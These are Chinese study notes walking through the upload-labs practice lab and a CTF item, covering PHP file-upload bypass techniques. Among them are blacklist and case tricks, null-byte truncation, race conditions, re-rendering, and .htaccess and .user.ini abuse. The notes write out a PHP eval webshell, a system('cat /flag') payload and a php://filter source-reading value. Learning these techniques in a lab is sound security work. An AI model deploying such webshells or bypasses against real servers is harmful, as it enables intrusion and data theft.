# 47WEB攻防-PHP应用&文件上传&函数缺陷&条件竞争&二次渲染&黑白名单&JS绕过

无文件解析安全问题上，格式解析是一对一的（不能jpg解析php）

换句话来说有解析错误配置或后缀解析漏洞时才能实现格式差异解析

\#测试环境安装参考：=

https://github.com/ffffffff0x/f8x

https://github.com/fuzzdb-project/fuzzdb

https://github.com/sqlsec/upload-labs-docker

安装f8x

```
wget -O f8x-ctf https://raw.githubusercontent.com/ffffffff0x/f8x/main/f8x-ctf
bash f8x-ctf -help
```

启动f8x

<img src="images/image-20251214143323067.png" alt="image-20251214143323067" style="zoom: 50%;" />

docker安装

```
f8x -d 或 f8x -docker
```

进入到目录 启动docker

```
docker-compose up -d
```

![image-20251214144923821](images/image-20251214144923821.png)

=== 由于代理问题无法使用Linux进行,改用window==

![image-20251214204014770](images/image-20251214204014770.png)

在github上下载后 

```
docker-compose up -d
```

![image-20251214233009355](images/image-20251214233009355.png)

# 第一关

经过测试只能上传图片和gif文件，上传其他文件会提示错误，

![image-20251214212817811](images/image-20251214212817811.png)

打开burp intercept is on  

![image-20251214233521926](images/image-20251214233521926.png)

修改`.png`为`.php`  ==仅适用于前端过滤==

![image-20251214233920343](images/image-20251214233920343.png)

后门代码

![image-20251214215843688](images/image-20251214215843688.png)

使用哥斯拉生成

![image-20251214215759819](images/image-20251214215759819.png)

连接图片地址

<img src="images/image-20251214234043895.png" alt="image-20251214234043895" style="zoom:50%;" />

## 第二关 .htaccess 文件 Apache

![image-20251214235025826](images/image-20251214235025826.png)

抓包修改内容

```
AddType application/x-httpd-php .png   //使png解析成php
```

![image-20251214235806165](images/image-20251214235806165.png)

上传后门

![image-20251215000112124](images/image-20251215000112124.png)

![image-20251215000203568](images/image-20251215000203568.png)

# 第三关

![image-20251215001025141](images/image-20251215001025141.png)

![image-20251215000518531](images/image-20251215000518531.png)

# 第四关

![image-20251215001508210](images/image-20251215001508210.png)

增加文件头部

![image-20251215132201448](images/image-20251215132201448.png)



![image-20251215115307091](images/image-20251215115307091.png)



## 第五关 黑名单

![image-20251215142400541](images/image-20251215142400541.png)

当你上传`.php`文件时，会把文件的后缀变为空  ==没有递归检测，只过滤了一次==

![image-20251215142237084](images/image-20251215142237084.png)

![image-20251215142912842](images/image-20251215142912842.png)

## 第六关 大小写

![image-20251215144538476](images/image-20251215144538476.png)

`replace`不区分大小写，文件只过滤了小写 ==在windows上是不区分大小写的，在适用于Linux==

![image-20251215144517884](images/image-20251215144517884.png)

## 第七&八关 %00截断符

![image-20251215150704966](images/image-20251215150704966.png)

%00截断符

![image-20251215150545634](images/image-20251215150545634.png)

00截断 是%00解码结果

url上 %00 （自带解码一次）

post下面 %00（手工解码一次）

## 第九关 白名单



![image-20251215211921540](images/image-20251215211921540.png)

用冷门后缀绕过，如php5   可以使用==fuzzdb-master字典==

## 第十关  逻辑漏洞

![image-20251215223126145](images/image-20251215223126145.png)

![image-20251215223057889](images/image-20251215223057889.png)

代码中先上传再判断然后不符合规定就删除，这个过程发生在瞬间，但是文件确实上传上去了

```
<?php                                                       ?>');?>
```

这里就是不更改任何东西，一直循环

```
http://127.0.0.1.nip.io:40010/upload/shell.pHP    //先抓访问的包
```

抓访问shell.php包循环

![image-20251215224051436](images/image-20251215224051436.png)

抓上传shell.php包循环

![image-20251215224529697](images/image-20251215224529697.png)

同样的方案

![image-20251215224842230](images/image-20251215224842230.png)

不断刷新访问xiao.php

![image-20251215232113658](images/image-20251215232113658.png)

## 11关 二次渲染

将文件上传，然后和原文件做笔记 使用软件 010 Editor

![image-20251216140731067](images/image-20251216140731067.png)

![image-20251216142623536](images/image-20251216142623536.png)

将后面代码写入不会改变内容的地方

```
<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
```

## ini

创建文件.user.ini

![image-20260103003246026](images/image-20260103003246026.png)

```
GIF89a
auto_prepend_file=a.jpg
```

上传.user.ini 修改Content-Type: image/jpg

![image-20260103004202752](images/image-20260103004202752.png)

上传成功

![image-20260103004357016](images/image-20260103004357016.png)

新建pass.jpg文件 直接上传

```
GIF89a
<?=eval($_REQUEST['pass']);?>
```

````
GIF89a
<?=system('cat /flag');?>
````

查看消息头

![image-20260103004722098](images/image-20260103004722098.png)

访问uploads/index.php成功出结果



另一个题目

![image-20260103151255134](images/image-20260103151255134.png)

抓包

```
Cookie: language=php://filter/read=convert.base64-encode/resource=flag
```

![image-20260103151348982](images/image-20260103151348982.png)

php://filter 是什么？

PHP 内置的 **流封装器**

可在**不执行代码的情况下读取源码**

常用于：

- 绕过 include 限制
- 读取敏感文件
- CTF 中“源码泄露

```
php://filter/read=convert.base64-encode/resource=flag
```

